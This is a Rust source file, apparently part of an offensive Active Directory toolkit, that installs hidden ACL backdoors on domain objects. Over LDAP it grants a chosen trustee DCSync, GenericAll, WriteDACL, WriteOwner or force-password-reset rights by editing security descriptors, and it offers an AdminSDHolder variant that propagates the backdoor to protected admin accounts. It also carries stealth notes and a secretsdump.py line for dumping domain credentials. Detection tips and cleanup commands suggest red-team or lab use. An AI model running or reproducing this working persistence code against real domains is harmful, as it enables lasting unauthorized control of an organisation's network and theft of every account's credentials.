//! ACL-based persistence — add hidden ACEs to domain objects.
//!
//! Grants a controlled account (trustee) DCSync rights, GenericAll,
//! or other dangerous permissions on AD objects for persistent access.

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap::LdapSession;
use tracing::{info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Well-known Extended Right GUIDs
const GUID_DS_REPLICATION_GET_CHANGES: &str = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";
const GUID_DS_REPLICATION_GET_CHANGES_ALL: &str = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2";
#[allow(dead_code)] // DCSync GUID kept for future use
const GUID_DS_REPLICATION_GET_CHANGES_FILTER: &str = "89e95b76-444d-4c62-991a-0facbeda640c";

/// Well-known GenericAll / WriteDACL / WriteOwner masks
const ADS_RIGHT_GENERIC_ALL: u32 = 0x10000000;
const ADS_RIGHT_WRITE_DAC: u32 = 0x00040000;
const ADS_RIGHT_WRITE_OWNER: u32 = 0x00080000;

/// ACL backdoor types
#[derive(Debug, Clone, serde::Serialize)]
pub enum AclBackdoorType {
    /// Grant DCSync rights (most common for domain-level persistence)
    DcSync,
    /// Grant GenericAll on the target object
    GenericAll,
    /// Grant WriteDACL (can modify permissions later)
    WriteDacl,
    /// Grant WriteOwner (can take ownership later)
    WriteOwner,
    /// Grant ForceChangePassword on user objects
    ForceChangePassword,
}

impl std::fmt::Display for AclBackdoorType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::DcSync => write!(f, "DCSync"),
            Self::GenericAll => write!(f, "GenericAll"),
            Self::WriteDacl => write!(f, "WriteDACL"),
            Self::WriteOwner => write!(f, "WriteOwner"),
            Self::ForceChangePassword => write!(f, "ForceChangePassword"),
        }
    }
}

/// Extended Right GUID: User-Force-Change-Password
const GUID_USER_FORCE_CHANGE_PASSWORD: &str = "00299570-246d-11d0-a768-00aa006e0529";

/// ADS_RIGHT_DS_CONTROL_ACCESS — required mask for extended rights ACEs
const ADS_RIGHT_DS_CONTROL_ACCESS: u32 = 0x00000100;

/// Install an ACL-based backdoor on an AD object.
///
/// Resolves the trustee's SID from AD, reads the target object's current
/// `nTSecurityDescriptor` via LDAP, appends the appropriate ACE(s), and
/// writes the modified descriptor back — producing a real persistent ACL entry.
pub async fn install_acl_backdoor(
    config: &ForgeConfig,
    target_dn: &str,
    trustee: &str,
) -> Result<ForgeResult> {
    info!(
        "[acl] Installing ACL backdoor on {} for {}",
        target_dn, trustee
    );

    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");

    let is_domain_root =
        target_dn.to_uppercase() == base_dn.to_uppercase() || target_dn.to_uppercase() == realm;

    let backdoor_type = if is_domain_root {
        AclBackdoorType::DcSync
    } else {
        AclBackdoorType::GenericAll
    };

    let effective_target = if is_domain_root {
        base_dn.clone()
    } else {
        target_dn.to_string()
    };

    // Build cleanup commands (always generated for operator reference)
    let cleanup_cmds = generate_cleanup_commands(
        &backdoor_type,
        &effective_target,
        trustee,
        &config.domain,
        &config.username,
        config.password.as_deref().unwrap_or("<PASSWORD>"),
        &config.dc_ip,
    );

    // ── Real LDAP write ──────────────────────────────────────────────────
    let mut ldap = if let Some(hash) = config.nt_hash.as_deref() {
        LdapSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash, false)
            .await?
    } else {
        let pw = config.password.as_deref().ok_or_else(|| {
            OverthroneError::TicketForge(
                "ACL backdoor requires either a password or an NT hash".to_string(),
            )
        })?;
        LdapSession::connect(&config.dc_ip, &config.domain, &config.username, pw, false).await?
    };

    // 1. Resolve trustee to binary SID
    let trustee_sid_bin = ldap.resolve_object_sid_binary(trustee).await?;

    // 2. Read current nTSecurityDescriptor
    let ntsd = ldap.read_ntsd(&effective_target).await?;

    // 3. Build ACE bytes for the requested backdoor type
    let ace_bytes = build_aces_for_backdoor_type(&backdoor_type, &trustee_sid_bin)?;

    // 4. Append ACEs into the DACL
    let new_ntsd = append_aces_to_dacl(&ntsd, &ace_bytes)
        .map_err(|e| OverthroneError::TicketForge(format!("SD modification failed: {e}")))?;

    // 5. Write modified SD back via LDAP modify-replace
    let write_result = ldap
        .modify_replace(&effective_target, "nTSecurityDescriptor", &new_ntsd)
        .await;
    ldap.disconnect().await.ok();

    let write_success = write_result.is_ok();
    if let Err(ref e) = write_result {
        warn!("[acl] nTSecurityDescriptor write failed: {e}");
    } else {
        info!(
            "[acl] ACL backdoor ({}) successfully written for {} on {}",
            backdoor_type, trustee, effective_target
        );
    }

    let ace_description = describe_aces(&backdoor_type, &effective_target, trustee, &config.dc_ip);

    let details = format!(
        "ACL Backdoor: {} on '{}' for trustee '{}':\n\
         \n\
         {}\n\
         \n\
         Detection:\n\
         - Event ID 5136 (Directory Service Changes) — look for nTSecurityDescriptor modifications\n\
         - Event ID 4662 — look for DS-Replication-Get-Changes property access\n\
         - Periodically audit ACLs on sensitive objects (domain root, AdminSDHolder, DC OUs)\n\
         - Compare ACL snapshots with tools like ADACLScanner or BloodHound\n\
         \n\
         Stealth notes:\n\
         - ACL changes survive password resets, Golden Ticket rotations, and krbtgt resets\n\
         - To persist across AdminSDHolder protection, also add the ACE to:\n\
         CN=AdminSDHolder,CN=System,{}\n\
         The SDProp process will propagate it to all protected objects every 60 minutes",
        backdoor_type, effective_target, trustee, ace_description, base_dn,
    );

    let message = if write_success {
        format!(
            "ACL backdoor ({}) successfully applied — '{}' now has {} on '{}'",
            backdoor_type, trustee, backdoor_type, effective_target
        )
    } else {
        format!(
            "ACL backdoor ({}) FAILED to write for '{}' on '{}': {}",
            backdoor_type,
            trustee,
            effective_target,
            write_result
                .err()
                .map(|e| e.to_string())
                .unwrap_or_default()
        )
    };

    Ok(ForgeResult {
        action: format!("ACL Backdoor ({})", backdoor_type),
        domain: config.domain.clone(),
        success: write_success,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: format!("ACL Backdoor — {}", backdoor_type),
            target: format!("{} → {}", trustee, effective_target),
            success: write_success,
            details,
            cleanup_command: Some(cleanup_cmds),
        }),
        message,
    })
}

/// Build ACE bytes for a given backdoor type and binary trustee SID.
fn build_aces_for_backdoor_type(
    backdoor_type: &AclBackdoorType,
    trustee_sid: &[u8],
) -> Result<Vec<u8>> {
    let mut all_aces = Vec::new();
    match backdoor_type {
        AclBackdoorType::DcSync => {
            let guid1 = guid_string_to_bytes(GUID_DS_REPLICATION_GET_CHANGES)?;
            let guid2 = guid_string_to_bytes(GUID_DS_REPLICATION_GET_CHANGES_ALL)?;
            // ACCESS_ALLOWED_OBJECT_ACE (0x05) with DS_CONTROL_ACCESS mask
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_DS_CONTROL_ACCESS,
                0x05,
                Some(&guid1),
            ));
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_DS_CONTROL_ACCESS,
                0x05,
                Some(&guid2),
            ));
        }
        AclBackdoorType::GenericAll => {
            // ACCESS_ALLOWED_ACE (0x00) with GenericAll mask
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_GENERIC_ALL,
                0x00,
                None,
            ));
        }
        AclBackdoorType::WriteDacl => {
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_WRITE_DAC,
                0x00,
                None,
            ));
        }
        AclBackdoorType::WriteOwner => {
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_WRITE_OWNER,
                0x00,
                None,
            ));
        }
        AclBackdoorType::ForceChangePassword => {
            let guid = guid_string_to_bytes(GUID_USER_FORCE_CHANGE_PASSWORD)?;
            all_aces.extend(build_ace_bytes(
                trustee_sid,
                ADS_RIGHT_DS_CONTROL_ACCESS,
                0x05,
                Some(&guid),
            ));
        }
    }
    Ok(all_aces)
}

/// Append raw ACE bytes to the DACL of an NT Security Descriptor.
///
/// Handles the binary SECURITY_DESCRIPTOR_RELATIVE layout:
/// - Reads OffsetDacl from the SD header (bytes 16–19)
/// - Reads AclSize and AceCount from the ACL header at OffsetDacl
/// - Inserts the new ACE bytes at the end of the existing ACEs
/// - Patches AclSize (+= ace_bytes.len()) and AceCount (+= count_of_new_aces)
/// - Adjusts any SD header offset fields that point past the insertion point
fn append_aces_to_dacl(sd: &[u8], ace_bytes: &[u8]) -> std::result::Result<Vec<u8>, String> {
    if sd.len() < 20 {
        return Err("Security descriptor too short (< 20 bytes)".to_string());
    }

    let control = u16::from_le_bytes([sd[2], sd[3]]);
    if control & 0x0004 == 0 {
        return Err("SE_DACL_PRESENT not set — no DACL to modify".to_string());
    }

    let offset_dacl = u32::from_le_bytes([sd[16], sd[17], sd[18], sd[19]]) as usize;
    if offset_dacl == 0 || offset_dacl + 8 > sd.len() {
        return Err(format!(
            "Invalid OffsetDacl={offset_dacl} (SD len={})",
            sd.len()
        ));
    }

    let current_acl_size = u16::from_le_bytes([sd[offset_dacl + 2], sd[offset_dacl + 3]]) as usize;
    let current_ace_count = u16::from_le_bytes([sd[offset_dacl + 4], sd[offset_dacl + 5]]);

    // Count the new ACEs by walking their headers
    let mut new_ace_count: u16 = 0;
    let mut pos = 0;
    while pos + 4 <= ace_bytes.len() {
        let sz = u16::from_le_bytes([ace_bytes[pos + 2], ace_bytes[pos + 3]]) as usize;
        if sz < 4 || pos + sz > ace_bytes.len() {
            break;
        }
        new_ace_count += 1;
        pos += sz;
    }

    let new_acl_size = current_acl_size + ace_bytes.len();
    if new_acl_size > u16::MAX as usize {
        return Err("ACL would exceed 65535 bytes after appending ACEs".to_string());
    }

    // Insertion point: immediately after the existing DACL content
    let insert_at = offset_dacl + current_acl_size;

    // Build new SD with ACE bytes inserted at insert_at
    let mut new_sd = Vec::with_capacity(sd.len() + ace_bytes.len());
    new_sd.extend_from_slice(&sd[..insert_at]);
    new_sd.extend_from_slice(ace_bytes);
    new_sd.extend_from_slice(&sd[insert_at..]);

    // Patch AclSize in DACL header (offset_dacl + 2..4)
    let new_size_le = (new_acl_size as u16).to_le_bytes();
    new_sd[offset_dacl + 2] = new_size_le[0];
    new_sd[offset_dacl + 3] = new_size_le[1];

    // Patch AceCount in DACL header (offset_dacl + 4..6)
    let new_count_le = (current_ace_count.saturating_add(new_ace_count)).to_le_bytes();
    new_sd[offset_dacl + 4] = new_count_le[0];
    new_sd[offset_dacl + 5] = new_count_le[1];

    // Adjust any SD header offset fields (OffsetOwner/Group/Sacl/Dacl) that point
    // at or past insert_at — they must be shifted by ace_bytes.len()
    // NOTE: OffsetDacl itself is NOT shifted since the DACL header starts *before*
    // insert_at; only offsets to regions *after* the inserted bytes need shifting.
    let shift = ace_bytes.len() as u32;
    for field_off in [4usize, 8, 12] {
        // OffsetOwner, OffsetGroup, OffsetSacl (OffsetDacl at 16 is NOT shifted)
        let offs = u32::from_le_bytes([
            new_sd[field_off],
            new_sd[field_off + 1],
            new_sd[field_off + 2],
            new_sd[field_off + 3],
        ]);
        if offs != 0 && offs as usize >= insert_at {
            let updated = (offs + shift).to_le_bytes();
            new_sd[field_off..field_off + 4].copy_from_slice(&updated);
        }
    }

    Ok(new_sd)
}

/// Produce a human-readable description of the ACEs being installed.
fn describe_aces(
    backdoor_type: &AclBackdoorType,
    target_dn: &str,
    trustee: &str,
    dc_ip: &str,
) -> String {
    match backdoor_type {
        AclBackdoorType::DcSync => format!(
            "ACEs added to '{}':\n\
             1. ALLOW {} ExtendedRight DS-Replication-Get-Changes ({})\n\
             2. ALLOW {} ExtendedRight DS-Replication-Get-Changes-All ({})\n\
             \n\
             After installation, '{}' can DCSync any account:\n\
             > secretsdump.py <domain>/{}@{}",
            target_dn,
            trustee,
            GUID_DS_REPLICATION_GET_CHANGES,
            trustee,
            GUID_DS_REPLICATION_GET_CHANGES_ALL,
            trustee,
            trustee,
            dc_ip,
        ),
        AclBackdoorType::GenericAll => format!(
            "ACE: ALLOW {} GenericAll (0x{:08X}) on '{}'\n\
             Full control: reset password, modify group membership, write SPNs, etc.",
            trustee, ADS_RIGHT_GENERIC_ALL, target_dn,
        ),
        AclBackdoorType::WriteDacl => format!(
            "ACE: ALLOW {} WriteDACL (0x{:08X}) on '{}'\n\
             Can modify the DACL later to grant any other rights.",
            trustee, ADS_RIGHT_WRITE_DAC, target_dn,
        ),
        AclBackdoorType::WriteOwner => format!(
            "ACE: ALLOW {} WriteOwner (0x{:08X}) on '{}'\n\
             Can take ownership then grant full WriteDACL → GenericAll.",
            trustee, ADS_RIGHT_WRITE_OWNER, target_dn,
        ),
        AclBackdoorType::ForceChangePassword => format!(
            "ACE: ALLOW {} User-Force-Change-Password ({})\n\
             Can reset the target user's password without knowing the old one.",
            trustee, GUID_USER_FORCE_CHANGE_PASSWORD,
        ),
    }
}

/// Install an ACL backdoor on AdminSDHolder for protected-object propagation.
///
/// The SDProp process runs every 60 minutes and copies the AdminSDHolder
/// ACL to all protected objects (Domain Admins, Enterprise Admins, etc.).
pub async fn install_adminsdholder_backdoor(
    config: &ForgeConfig,
    trustee: &str,
) -> Result<ForgeResult> {
    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");

    let sdholder_dn = format!("CN=AdminSDHolder,CN=System,{}", base_dn);

    info!(
        "[acl] Installing AdminSDHolder backdoor for {} on {}",
        trustee, sdholder_dn
    );

    // Delegate to the main function with AdminSDHolder as target
    install_acl_backdoor(config, &sdholder_dn, trustee).await
}

// ═══════════════════════════════════════════════════════════
// Cleanup Command Generator
// ═══════════════════════════════════════════════════════════

fn generate_cleanup_commands(
    backdoor_type: &AclBackdoorType,
    target_dn: &str,
    trustee: &str,
    domain: &str,
    username: &str,
    password: &str,
    dc_ip: &str,
) -> String {
    let short_domain = domain.split('.').next().unwrap_or(domain);

    let rights_str = match backdoor_type {
        AclBackdoorType::DcSync => "DCSync",
        AclBackdoorType::GenericAll => "All",
        AclBackdoorType::WriteDacl => "WriteDacl",
        AclBackdoorType::WriteOwner => "WriteOwner",
        AclBackdoorType::ForceChangePassword => "ResetPassword",
    };

    format!(
        "# Remove ACL backdoor:\n\
         \n\
         # PowerView:\n\
         Remove-DomainObjectAcl -TargetIdentity '{}' \\\n\
             -PrincipalIdentity '{}' -Rights {} -Verbose\n\
         \n\
         # dacledit.py:\n\
         dacledit.py {}/{}:'{}'@{} \\\n\
             -action remove -rights {} \\\n\
             -principal '{}' -target '{}'\n\
         \n\
         # Verify removal:\n\
         Get-DomainObjectAcl -Identity '{}' | \\\n\
             ? {{$_.SecurityIdentifier -match (Get-ADUser '{}').SID}} | fl",
        target_dn,
        trustee,
        rights_str,
        short_domain,
        username,
        password,
        dc_ip,
        rights_str,
        trustee,
        target_dn,
        target_dn,
        trustee,
    )
}

/// Build a raw security descriptor ACE in binary for LDAP modify.
/// This would be used for the direct LDAP-modify approach without PowerShell.
pub fn build_ace_bytes(
    trustee_sid: &[u8],
    access_mask: u32,
    ace_type: u8,               // 0x05 = ACCESS_ALLOWED_OBJECT_ACE
    object_guid: Option<&[u8]>, // 16-byte GUID for extended rights
) -> Vec<u8> {
    let mut ace = Vec::new();

    // ACE_HEADER
    ace.push(ace_type); // AceType
    ace.push(0x00); // AceFlags (no inheritance by default)

    // Placeholder for AceSize (fill in at end)
    let size_offset = ace.len();
    ace.extend_from_slice(&0u16.to_le_bytes());

    // ACCESS_MASK
    ace.extend_from_slice(&access_mask.to_le_bytes());

    if ace_type == 0x05 {
        // ACCESS_ALLOWED_OBJECT_ACE_TYPE
        // Flags: ACE_OBJECT_TYPE_PRESENT = 0x01
        let flags: u32 = if object_guid.is_some() { 0x01 } else { 0x00 };
        ace.extend_from_slice(&flags.to_le_bytes());

        // ObjectType GUID (extended right identifier)
        if let Some(guid) = object_guid {
            ace.extend_from_slice(guid);
        }

        // InheritedObjectType — not set (no sub-object scoping)
        // (only present if flags & 0x02)
    }

    // Trustee SID
    ace.extend_from_slice(trustee_sid);

    // Patch AceSize
    let ace_size = ace.len() as u16;
    ace[size_offset] = (ace_size & 0xFF) as u8;
    ace[size_offset + 1] = ((ace_size >> 8) & 0xFF) as u8;

    ace
}

/// Parse a GUID string "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" into
/// the mixed-endian binary format used in LDAP/ACE structures.
pub fn guid_string_to_bytes(guid: &str) -> Result<[u8; 16]> {
    let clean = guid.replace('-', "");
    if clean.len() != 32 {
        return Err(OverthroneError::TicketForge(format!(
            "Invalid GUID length: expected 32 hex chars, got {}",
            clean.len()
        )));
    }

    let raw = hex::decode(&clean)
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid GUID hex: {e}")))?;

    // Microsoft GUIDs are mixed-endian:
    // - First 3 components (4-2-2 bytes) are little-endian
    // - Last 2 components (2-6 bytes) are big-endian
    let mut out = [0u8; 16];
    // Data1 (4 bytes LE)
    out[0] = raw[3];
    out[1] = raw[2];
    out[2] = raw[1];
    out[3] = raw[0];
    // Data2 (2 bytes LE)
    out[4] = raw[5];
    out[5] = raw[4];
    // Data3 (2 bytes LE)
    out[6] = raw[7];
    out[7] = raw[6];
    // Data4 (8 bytes BE — as-is)
    out[8..16].copy_from_slice(&raw[8..16]);

    Ok(out)
}
